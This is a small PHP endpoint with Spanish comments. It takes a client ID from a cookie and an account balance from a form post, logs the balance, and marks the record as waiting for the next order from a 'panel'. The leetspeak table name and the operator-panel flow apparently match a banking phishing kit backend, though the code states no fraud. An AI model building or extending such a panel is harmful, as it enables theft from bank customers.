<?php
/**
 * guardar_saldo.php (Versión Opción 1 - Simplificada)
 * Cambia el estado a 1 (esperando siguiente orden del panel)
 * 
 * INSTRUCCIONES:
 * 1. Reemplaza 'nombre_tabla' con el nombre real de tu tabla
 * 2. Reemplaza 'idreg' con el nombre real del campo ID
 * 3. Reemplaza 'status' si tu campo tiene otro nombre
 */

require_once('../lib/class.inputfilter.php');
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');

$ifilter = new InputFilter();

// Obtener ID del cliente desde cookie
$id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';

// Obtener saldo desde POST (se valida pero no se guarda)
$saldo = isset($_POST['saldo']) ? $ifilter->process($_POST['saldo']) : '';

// Validar que tenemos datos
if ($id === '' || $id === '0' || $saldo === '') {
	http_response_code(400);
	echo 'ERR';
	exit;
}

try {
	// Cambiar estado a 1 (estado inicial/esperando siguiente orden del panel)
	$query = "UPDATE m3it3m 
	          SET status = '1' 
	          WHERE idreg = :id";
	
	$stmt = $conexion->prepare($query);
	$stmt->bindParam(':id', $id);
	
	if ($stmt->execute()) {
		// Log opcional del saldo (para referencia)
		error_log("Saldo recibido para ID $id: $saldo");
		echo 'OK';
	} else {
		http_response_code(500);
		echo 'ERR';
	}
	
} catch (Exception $e) {
	error_log('Error actualizando estado: ' . $e->getMessage());
	http_response_code(500);
	echo 'ERR';
	exit;
}
?>
